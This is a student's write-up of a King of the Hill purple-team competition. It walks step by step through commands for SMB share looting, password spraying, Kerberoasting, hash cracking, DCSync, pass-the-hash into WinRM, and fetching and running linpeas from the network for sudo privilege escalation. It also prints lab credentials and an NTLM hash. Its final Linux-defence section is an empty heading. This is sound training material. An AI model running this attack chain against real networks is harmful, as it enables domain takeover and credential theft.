## KOTH Writeup
# Cal Poly Swfit KOTH - Write-Up
---

## 1. Overview on the competition

This KOTH competition was a purple team competition set up by the amazing Cal Poly Swift where compeitors would log remote into a kali machine and attack 6 machines, gain root, plant their flag, and defend the flag and their services from other hackers trying to plan theirs.

Due to us not having direct access to the envrionment we had to use ssh tunnelling to access things like the websites, set up blood hound, and more.



<img width="680" height="801" alt="image" src="https://github.com/user-attachments/assets/5127f953-ef93-4e30-b15e-df02a568e3a3" />

This was the competition environment, each machine had a scored service which was either WinRM (port 5895/5896) or SSH (port 22). This came up to 6 total scored services. 

In order to get scored you had to be able keep your services running and secured while having your flag in one of the specified file locations:

Linux: /root/flag.txt

Windows: \Users\Administrator\Desktop\flag.txt

Also, for the sake of fun, you cant change the root/Administrator password.

There was also trivia questions what would give us points if we answered them correctly and fast enough.

---

 At the start, i went ahead and tried to gain access to a linux machine at first but after the first hour i went onto Windows so ill go over my attack path for windows first.

---

## Attacking Windows

To start off with windows i did an nmap scan to see what ports were open. 

   
    nmap -sC -sV -T5 10.109.124.214

<img width="1227" height="938" alt="Screenshot 2025-12-01 000733" src="https://github.com/user-attachments/assets/f31fec3b-c64e-416d-8f33-67847c29d8ed" />


So in this screenshot, i was able to see that ldap and kerberos are open as well as the domain name which we needed for our first trivia question.

At this point i was stuck because i thought that i needed credentials to get any useful information out the services. That was until, trivia question 2!

<img width="1020" height="285" alt="image" src="https://github.com/user-attachments/assets/055aeaf4-60ab-4ca3-a580-80ca98580bdf" />

This question allowed me to finally start chipping away at windows. 

First, I did this command to find all smb shares on the machine.

    smbclient -L 10.109.124.232

<img width="637" height="239" alt="image" src="https://github.com/user-attachments/assets/bc822165-d897-4bc2-8d6a-25da91c2514e" />

After getting a look at the shares i instantly suspected that data was the share with plain text credentials so i used this command to log in. When I logged in, i found the file and sent it to my home directory with these two commands

    smbclient //10.109.124.232/Data -N
    ------------------------------------
    ls
    get creds.txt

 <img width="803" height="347" alt="image" src="https://github.com/user-attachments/assets/500b8fc0-846d-4adb-903e-9292d2d16377" />


Finally, after i got the file i got my credentials.


<img width="227" height="194" alt="image" src="https://github.com/user-attachments/assets/b9ad7189-c87f-4892-92c4-6f024a6f663e" />


With these credentials i was able to set up a password spray attack to see what accounts worked.

    nxc smb 10.109.124.214 10.109.124.241 10.109.124.232 -u users.txt -p passwords.txt
 
<img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/66e7f2a0-e7fb-49ad-9e61-f109146c1a8a" />



After i found a valid login i used it to perform a kereroast attack on the domain controller (Since kereberos was open). 


    impacket-GetUserSPNs -request -dc-ip 10.109.124.214 kingofthehill.local/ghostadmin:Resurrect1 > output.txt


<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />


Now that i got the kereberos hashes it was time to crack them with hashcat.


    hashcat -a 0 output.txt /usr/share/wordlists/rockyou.txt.gz
    

<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />

<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />

With my new credentials, i went ahead and ran nxc again to see what i could do with them.

    nxc smb 10.109.124.214 10.109.124.241 10.109.124.232 -u peggy -p password2
    
<img width="805" height="412" alt="Screenshot 2025-12-04 014258" src="https://github.com/user-attachments/assets/5b20ed1d-55cb-478a-becd-4ea188974875" />

This was good news, The pwned text meant that my account had some sort of admin and in this case, my new account was a Domain Admin. 


With these credentials, i performed a DCSync attack on the Domain Controller so i could get a dump of all NTLM hashes.

    impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214 -just-dc

<img width="867" height="229" alt="image" src="https://github.com/user-attachments/assets/de9afc0e-679a-42a3-a264-e61782918247" />

NTLM hashes are special, instead of using hashcat to find the admin password you can use something called Pass-The-Hash to log in as Admin. We will be doing that with evil-winrm.

    evil-winrm -i 10.109.124.214 -u Adminstrator -H 5c5aefbcab1053c010bc9c1cfcc6f95d
    
<img width="711" height="272" alt="image" src="https://github.com/user-attachments/assets/b7d12dd9-a692-41c1-bb92-4252fd2ab4d0" />

---
## Defending Windows
Once I got admin, I had to plant my flag and secure the machine so other hackers couldn't steal it. At first, i used a simple echo command and pushed the output into the flag but, eventually an attacker stole my box so, i made a looping bash script that would: check if the file was there, put it back, and make it read only/hidden


    echo "FLAG-S3X7Q5K8M2T9R4BL" > C:\Users\Administrator\Desktop\flag.txt
    ------------------------------------
    $flag = "FLAG-S3X7Q5K8M2T9R4BL"
    $path = "C:\Users\Administrator\Desktop\flag.txt"
 
    while($true) {
    # Check if the file content has changed
    $current = Get-Content $path -ErrorAction SilentlyContinue
    if ($current -ne $flag) {
        # If changed/deleted, write it back immediately
        echo $flag > $path
        # Lock it (Read-only + Hidden)
        attrib +r +h $path
        Write-Host "Flag restored!"
    }
    Start-Sleep -Seconds 2
    }

 <img width="800" height="413" alt="image" src="https://github.com/user-attachments/assets/5875fcd0-8a7c-448a-ba70-7eebca649278" />

Somehow the attacker still was able to steal my flag and i had to figure out a way to get it back. One thing i knew is that we couldnt delete files so the only way which went that my script was partily flawed but for a quick fix i just removed the attributes and then ran my script again. 

    attrib -r -h -s C:\Users\Administrator\Desktop\flag.txt

   <img width="1007" height="306" alt="image" src="https://github.com/user-attachments/assets/0c55e992-6576-4a5a-a5b7-85263205a810" />

After that, i changed the passwords of the domain admin accounts that i used to get the NTML hash sicne i couldnt change the admin password, i had to remediate my path to admin so no one else could use it.  

    net user peggy SUPER_L0NG_PASS123!
    ------------------------------------
    $impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214
<img width="714" height="302" alt="image" src="https://github.com/user-attachments/assets/87319f8f-d6a0-4a34-bead-28ed47a859c9" />


<img width="714" height="236" alt="image" src="https://github.com/user-attachments/assets/3da1b254-e231-43f6-99c9-59c994d49f30" />

Finally, when that was over, I went ahead and did the same in the remaining Windows machines.

<img width="358" height="18" alt="image" src="https://github.com/user-attachments/assets/2b5f2520-f3ff-4c1b-aaee-a602416aa17b" />

---
## Attacking Linux

After i got claimed all of the windows boxes, i thought about using some of the credentials that i gained from the Windows machines and luckily, i got a hit! But soon after i logged in, i got kicked off by the person defending the machine.

<img width="1076" height="457" alt="image" src="https://github.com/user-attachments/assets/6d677a74-ad4e-4287-92e0-a983072058ab" />

<img width="637" height="38" alt="image" src="https://github.com/user-attachments/assets/b319378f-f6c2-49cf-be80-8fdf72a32841" />

At that point, I decided to log back in and try to get linpeas (A Linux privledge escalation tool) running.


    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
    ------------------------------------
     chmod +x linpeas.sh
     ./linpeas.sh
     
While it was running, I found that the sudoers file was misconfigured so I was able to run admin credentials without an admin password.

<img width="1354" height="160" alt="image" src="https://github.com/user-attachments/assets/7e82dd93-4ff5-4aff-808e-6b9f6aec5e22" />

This was because of ``(ALL : ALL) NOPASSWD: ALL `` This meant that everyone could run sudo without valid access and with that i did `` sudo bash `` to turn root.


---
## Defending Linux



